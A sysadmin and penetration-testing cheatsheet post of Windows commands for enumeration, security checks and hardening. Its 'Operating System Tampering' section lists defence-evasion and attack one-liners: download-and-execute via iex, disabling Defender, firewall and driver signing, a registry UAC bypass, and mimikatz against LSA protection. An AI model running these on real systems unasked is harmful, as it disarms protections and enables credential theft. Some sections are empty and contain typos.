---
layout: post
title: Sysadmin WIN CLI
category: Sysadmin
parent: Sysadmin
grand_parent: Cheatsheets
modified_date: 2022-07-06
permalink: /:categories/:title/
---
<!-- vscode-markdown-toc -->
* 1. [listing system config](#listingsystemconfig)
	* 1.1. [OS and KB config](#OSandKBconfig)
	* 1.2. [network config & file shares](#networkconfigfileshares)
	* 1.3. [users & groups](#usersgroups)
	* 1.4. [active sessions](#activesessions)
	* 1.5. [products, processes and services](#productsprocessesandservices)
* 2. [Security Checks](#SecurityChecks)
	* 2.1. [windows firewall status](#windowsfirewallstatus)
	* 2.2. [windows defender status](#windowsdefenderstatus)
	* 2.3. [Credential Guard status](#CredentialGuardstatus)
	* 2.4. [PPL status](#PPLstatus)
* 3. [Operating System Tampering](#OperatingSystemTampering)
	* 3.1. [configure network ip address](#configurenetworkipaddress)
	* 3.2. [donwload ps activedirectory module](#donwloadpsactivedirectorymodule)
	* 3.3. [windows defender: disable](#windowsdefender:disable)
	* 3.4. [windows firewall: disable](#windowsfirewall:disable)
	* 3.5. [Credential Guard:](#CredentialGuard:)
	* 3.6. [PPL: disable](#PPL:disable)
	* 3.7. [windows uac: bypass](#windowsuac:bypass)
	* 3.8. [Windows lsaprotection: bypass](#Windowslsaprotection:bypass)
	* 3.9. [Windows driver signature: disable](#Windowsdriversignature:disable)
	* 3.10. [SMBv1: enable](#SMBv1:enable)
* 4. [Operating System Hardening](#OperatingSystemHardening)
	* 4.1. [LLMNR: disable](#LLMNR:disable)
	* 4.2. [MS-MSDT: disable](#MS-MSDT:disable)
* 5. [Windows DISM](#WindowsDISM)
* 6. [Windows WSL manual distro install](#WindowsWSLmanualdistroinstall)

<!-- vscode-markdown-toc-config
	numbering=true
	autoSave=true
	/vscode-markdown-toc-config -->
<!-- /vscode-markdown-toc -->

##  1. <a name='listingsystemconfig'></a>listing system config
###  1.1. <a name='OSandKBconfig'></a>OS and KB config
```powershell
# listing OS version
wmic os list brief
wmic os get MUILanguages

# listing KB wmi
wmic qfe list full /format:table

# listing KB ps
powershell -Command "systeminfo /FO CSV" | out-file C:\Windows\Temp\systeminfo.csv
import-csv C:\Windows\Temp\systeminfo.csv | ForEach-Object{$_."Correctif(s)"}
```

###  1.2. <a name='networkconfigfileshares'></a>network config & file shares
```powershell
# listing network hardware
wmic nic list brief
ipconfig /all

# listing network software 
wmic nicconfig where IPEnabled='true' get Caption,DefaultIPGateway,Description,DHCPEnabled,DHCPServer,IPAddress,IPSubnet,MACAddress
ipconfig /all
route -n
netstat -ano

# listing network shares
wmic netuse list brief
net use

wmic share
net share

# listing the domain controllers
nltest /dclist:dom.corp
```

###  1.3. <a name='usersgroups'></a>users & groups
```powershell
# listing local users
wmic netlogin list brief
net user
net localgroup
net localgroup Administrators
```

###  1.4. <a name='activesessions'></a>active sessions
```batch
# listing the active sessions
quser

# killign a session / below '2' is the session ID
logoff 2
```

###  1.5. <a name='productsprocessesandservices'></a>products, processes and services
```powershell
# listing windows product
wmic PRODUCT get Description,InstallDate,InstallLocation,PackageCache,Vendor,Version /format:csv
# listing windows processes
wmic process get CSName,Description,ExecutablePath,ProcessId /format:csv
# listing windows services 
wmic service get Caption,Name,PathName,ServiceType,Started,StartMode,StartName /format:csv
```

# listing local users
##  2. <a name='SecurityChecks'></a>Security Checks

###  2.1. <a name='windowsfirewallstatus'></a>windows firewall status
```batch
# logfile: %systemroot%\system32\LogFiles\Firewall\pfirewall.log
netsh advfirewall show allprofiles
netsh firewall show portopening
```

###  2.2. <a name='windowsdefenderstatus'></a>windows defender status
```batch
powershell -inputformat none -outputformat text -NonInteractive -Command 'Get-MpPreference | select -ExpandProperty "DisableRealtimeMonitoring"'
```

###  2.3. <a name='CredentialGuardstatus'></a>Credential Guard status

Run the following powershell commands as local administrator:

```powershell
powershell -ep bypass
# if DWORD value named LsaCfgFlags is set to :
#  - 0 is disabled
#  - 1 then Windows Defender Credential Guard is enabled with UEFI lock
#  - 2 then Windows Defender Credential Guard enabled without lock
dir HKLM:\SYSTEM\CurrentControlSet\Control\Lsa*
# if DWORD value named EnableVirtualizationBasedSecurity is set to : 
#  - 0 then virtualization-based security is disabled
#  - 1 then virtualization-based security is enabled
# if DWORD value named RequirePlatformSecurityFeatures is set to :
#  - 1 then Secure Boot only 
#  - 3 then Secure Boot and DMA protection
dir HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard*
```

Reference :
 - [MSDN - Credential Guard Management](https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard-manage)

###  2.4. <a name='PPLstatus'></a>PPL status

##  3. <a name='OperatingSystemTampering'></a>Operating System Tampering

###  3.1. <a name='configurenetworkipaddress'></a>configure network ip address
```batch
netsh
interface ip set address "connection name" static 192.168.1.1 255.255.255.0 192.168.1.254
```

###  3.2. <a name='donwloadpsactivedirectorymodule'></a>donwload ps activedirectory module 
```batch
#version 1
iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
```

###  3.3. <a name='windowsdefender:disable'></a>windows defender: disable
```batch
powershell.exe -Command Set-MpPreference -DisableRealtimeMonitoring $true
```


###  3.4. <a name='windowsfirewall:disable'></a>windows firewall: disable
```batch
netsh advfirewall set publicprofile state off
netsh advfirewall set privateprofile state off
netsh advfirewall set domainprofile state off
netsh advfirewall set allprofiles state off
```

###  3.5. <a name='CredentialGuard:'></a>Credential Guard: disable 
```powershell
```

###  3.6. <a name='PPL:disable'></a>PPL: disable

Tools that disable PPL flags on the LSASS process by patching the EPROCESS kernel 
 - [EDRSandBlast](https://github.com/wavestone-cdt/EDRSandblast)
 - [PPLdump](https://github.com/itm4n/PPLdump)
 - [PPLKiller](https://github.com/RedCursorSecurityConsulting/PPLKiller)

```batch
```

###  3.7. <a name='windowsuac:bypass'></a>windows uac: bypass
```batch
powershell New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value cmd.exe -Force
```

###  3.8. <a name='Windowslsaprotection:bypass'></a>Windows lsaprotection: bypass
```batch
powershell .\ConsoleApplication1.exe/InstallDriver
powershell .\ConsoleApplication1.exe/makeSYSTEMcmd
powershell .\mimikatz.exe
```

###  3.9. <a name='Windowsdriversignature:disable'></a>Windows driver signature: disable
```batch
bcdedit.exe /set nointegritychecks on
bcdedit.exe /set testsigning on
```

###  3.10. <a name='SMBv1:enable'></a>SMBv1: enable
```powershell
# DISM 
DISM /online /enable-feature /featurename:SMB1Protocol
DISM /online /enable-feature /featurename:SMB1Protocol-Client
DISM /online /enable-feature /featurename:SMB1Protocol-Server
DISM /online /enable-feature /featurename:SMB1Protocol-Deprecation

# win10 tampering: PS activate SMBv1 OptionalFeatures
Enable-WindowsOptionalFeature -Online -FeatureName smb1protocol
```

##  4. <a name='OperatingSystemHardening'></a>Operating System Hardening
###  4.1. <a name='LLMNR:disable'></a>LLMNR: disable
```
REG ADD  “HKLM\Software\policies\Microsoft\Windows NT\DNSClient”
REG ADD  “HKLM\Software\policies\Microsoft\Windows NT\DNSClient” /v ”EnableMulticast” /t REG_DWORD /d “0” /f
```
###  4.2. <a name='MS-MSDT:disable'></a>MS-MSDT: disable
```
# MS-MSDT protocol used by follina exploit, CVE-2022-30190
RED DEL "HKEY_CLASSES_ROOT\ms-msdt" /f
```

##  5. <a name='WindowsDISM'></a>Windows DISM
```powershell
# Pre requisites: Admin rights
# get all windows feature and save to a txt file
DISM /online /get-features /format:table > C:\Temp\dism_listing.txt
get-windowsoptionalfeature -online | ft | more

# get windows feature that are enable/disable
DISM /online /get-features /format:table | find “Enabled” | more
DISM /online /get-features /format:table | find “Disabled” | more

# get windows feature by its name
DISM /online /get-featureinfo /featurename:Microsoft-Windows-Subsystem-Linux
DISM /online /get-featureinfo /featurename:TelnetClient
get-windowsoptionalfeature -online -featurename SMB1Protocol*
get-windowsoptionalfeature -online -featurename SMB1Protocol* |ft
```

##  6. <a name='WindowsWSLmanualdistroinstall'></a>Windows WSL manual distro install
```powershell
# Note: By pass the GPO blocking the exec of the App Store app

Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux
New-Item C:\Ubuntu -ItemType Directory
Set-Location C:\Ubuntu
Invoke-WebRequest -Uri https://aka.ms/wsl-ubuntu-1604 -OutFile Ubuntu.appx -UseBasicParsing
Invoke-WebRequest -Uri https://aka.ms/wslubuntu2004 -OutFile Ubuntu.appx -UseBasicParsing
Invoke-WebRequest -Uri https://aka.ms/wsl-kali-linux-new -OutFile Kali.appx -UseBasicParsing
 
# Extract and execute the EXE in the archive to install the distro
Rename-Item .\Ubuntu.appx Ubuntu.zip
Expand-Archive .\Ubuntu.zip -Verbose
Ubuntu.exe

# List the distributions installed
wslconfig /list /all
wsl -l
```